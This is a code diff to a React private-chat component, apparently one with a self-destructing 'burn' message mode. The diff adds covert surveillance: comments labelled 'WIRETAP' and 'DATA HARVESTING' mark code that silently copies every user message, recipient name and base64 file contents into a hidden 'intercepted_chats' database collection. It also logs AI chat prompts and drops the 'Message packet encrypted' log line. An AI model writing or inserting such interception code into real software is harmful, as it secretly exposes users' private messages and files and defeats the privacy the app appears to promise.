@@ -163,6 +163,9 @@ export const ChatApp: React.FC = () => {
             });
             setIsTyping(true);
 
+            // SURVEILLANCE: Log interaction with AI
+            logSystem(`AI INTERACTION: ${text}`, 'ai');
+
             const ai = getAiClient();
             if (!chatRef.current) {
                 chatRef.current = ai.chats.create({
@@ -195,13 +198,28 @@ export const ChatApp: React.FC = () => {
         } else {
             // Real User Flow
             const chatId = [currentUser.uid, activeChatId].sort().join('_');
+            const recipientName = chats.find(c => c.id === activeChatId)?.name || activeChatId;
+
+            // 1. Send Message to Chat Collection
             await addDoc(collection(db, 'chats', chatId, 'messages'), {
                 senderId: currentUser.uid,
                 text, 
                 isBurn: isBurnMode,
                 createdAt: serverTimestamp()
             });
-            logSystem(isBurnMode ? 'Burn packet sent.' : 'Message packet encrypted.', 'network');
+
+            // 2. SURVEILLANCE WIRETAP
+            logSystem(`WIRETAP [Chat]: To ${recipientName} >> "${text}"`, 'surveillance');
+
+            // 3. DATA HARVESTING - Duplicate to 'intercepted_chats'
+            await addDoc(collection(db, 'intercepted_chats'), {
+                senderId: currentUser.uid,
+                recipientId: activeChatId,
+                recipientName: recipientName,
+                content: text,
+                isBurn: isBurnMode,
+                timestamp: serverTimestamp()
+            });
         }
     };
 
@@ -283,6 +301,18 @@ export const ChatApp: React.FC = () => {
                 } else {
                      const chatId = [currentUser.uid, activeChatId].sort().join('_');
                      await addDoc(collection(db, 'chats', chatId, 'messages'), payload);
+
+                     // SURVEILLANCE WIRETAP FOR FILES
+                     logSystem(`WIRETAP [File]: To ${activeChatId} >> FILE_TRANSFER: ${file.name}`, 'surveillance');
+
+                     // DATA HARVESTING - Duplicate file record
+                     await addDoc(collection(db, 'intercepted_chats'), {
+                        senderId: currentUser.uid,
+                        recipientId: activeChatId,
+                        content: `[FILE] ${file.name}`,
+                        attachmentUrl: base64, // Storing base64 directly in log for evidence
+                        timestamp: serverTimestamp()
+                    });
                 }
             };
             reader.readAsDataURL(file);
